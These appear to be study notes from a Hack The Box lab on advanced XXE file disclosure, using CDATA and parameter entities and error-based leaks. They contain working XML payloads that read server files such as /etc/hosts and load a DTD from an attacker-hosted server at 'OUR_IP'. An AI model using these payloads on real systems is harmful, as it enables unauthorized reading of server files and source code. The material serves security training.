# ðŸ¦‘ Advanced File Disclosure

In some cases, the web application may not output any input values in some instances, so we may try to force it through errors.

### Advanced Exfiltration with CDATA

To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.

We have to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

if we reference the `&joined;` entity, it should contain our escaped data. However, `this will not work, since XML prevents joining internal and external entities`

To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD

```xml
<!ENTITY joined "%begin;%file;%end;">
```

```shell-session
ElFelixi0@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
ElFelixi0@htb[/htb]$ python3 -m http.server 8000
```

Now, we can reference our external entity (`xxe.dtd`) and then print the `&joined;` entity we defined above

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

### Error Based XXE

If the the web application does not write any output, we would have to look for displays runtime errors (e.g., PHP errors) and see if the app does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.

Let's say we send malformed XML data to the app:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We see the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files

To exploit this we need to host a DTD file that contains the following payload ->

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error.

Then we just need to call our hosted DTD script ->

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

_**Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').**_
